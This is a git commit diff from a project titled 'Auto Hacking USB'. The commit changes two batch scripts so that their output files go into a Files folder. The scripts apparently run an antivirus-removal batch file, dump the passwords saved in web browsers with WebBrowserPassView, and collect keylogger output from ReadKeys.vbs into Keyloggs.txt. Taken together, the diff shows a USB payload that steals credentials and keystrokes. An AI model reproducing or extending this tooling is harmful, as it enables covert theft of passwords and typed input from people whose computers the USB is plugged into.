a3f768b9188a20567af586e57550d9e2e96acc9c
xyse <xyseprg@gmail.com>
2015-06-17 21:08:36 +0200

    Organization
    Txt's go to the folder \ files for readability

--- Get keloggs.bat
+++ Get keloggs.bat
@@ -1,4 +1,4 @@
 start ReadKeys.vbs
 ping 1.1.1.1 -n 1 -w 200 > nul
-ClipOut /T > Keyloggs.txt
+ClipOut /T > .\Files\Keyloggs.txt
 exit
--- Start.bat
+++ Start.bat
@@ -3,7 +3,7 @@ title Auto Hacking USB - xyse
 :Start
 start .\App\avrem.bat
 ping localhost -n 2 >nul
-start .\App\WebPass\WebBrowserPassView.exe /stext Passwords.txt
+start .\App\WebPass\WebBrowserPassView.exe /stext .\Files\Passwords.txt
 start input.vbs
 exit
 
